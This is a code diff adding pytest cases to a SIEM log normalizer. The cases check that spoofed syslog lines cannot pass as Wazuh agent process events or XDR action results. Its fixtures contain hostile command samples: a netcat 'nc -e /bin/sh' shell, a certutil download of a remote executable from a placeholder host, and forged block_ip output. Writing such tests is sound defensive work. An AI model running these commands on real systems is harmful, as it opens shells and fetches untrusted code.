@@ -169,6 +169,39 @@ def test_wazuh_syslog_rfc5424_suricata():
     assert get(d, "suricata.signature") == "ET WEB_SERVER SQL Injection"
 
 
+FORGED_AUDIT = {"audit": {"type": "EXECVE", "exe": "/usr/bin/nc", "command": "nc",
+                          "execve": {"a0": "nc", "a1": "-e", "a2": "/bin/sh"}}}
+FORGED_WIN = {"win": {"system": {"eventID": "1", "providerName": "Microsoft-Windows-Sysmon"},
+                      "eventdata": {"image": "C:\\Windows\\System32\\certutil.exe",
+                                    "commandLine": "certutil -urlcache -f http://x/a.exe a.exe"}}}
+
+
+def _with_data(ev, data):
+    ev["data"]["data"] = data
+    return ev
+
+
+@pytest.mark.parametrize("data,line", [
+    (FORGED_AUDIT, 'type=EXECVE msg=audit(1.1:1): argc=3 a0="nc" a1="-e" a2="/bin/sh"'),
+    (FORGED_WIN, '{"win":{}}'),
+    (None, "siem-proc: pid=4242 ppid=1 uid=0 name=sh parent=httpd exe=/bin/sh cmd=sh -c id"),
+    (None, "siem-xdr: action=deadbeefcafe type=block_ip target=203.0.113.9 status=success"),
+])
+def test_syslog_cannot_forge_agent_telemetry(data, line):
+    # syslog qua UDP giả được IP nguồn: nội dung chỉ được qua bộ đọc syslog, không thành event tiến trình / kết quả lệnh
+    ev = wazuh_syslog("10.10.40.254", line)
+    d = normalize(_with_data(ev, data) if data else ev)
+    assert get(d, "agent.id") == "syslog-10.10.40.254"
+    assert get(d, "event.category") != "process" and get(d, "process.command_line") is None
+    assert get(d, "event.module") not in ("auditd", "sysmon", "windows", "siem-xdr")
+
+
+def test_agent_audit_event_still_parsed():
+    ev = _with_data(wazuh_agent_event("001", "/var/log/audit/audit.log", 'type=EXECVE argc=3 a0="nc"'), FORGED_AUDIT)
+    d = normalize(ev)
+    assert get(d, "event.category") == "process" and "nc" in get(d, "process.command_line")
+
+
 def test_agent_event_is_not_treated_as_syslog():
     d = normalize(wazuh_agent_event("001", "/var/log/auth.log", "Nov  1 10:00:01 web01 sshd[811]: " + SSH_FAIL))
     assert get(d, "agent.id") == "001" and get(d, "observer.ip") is None
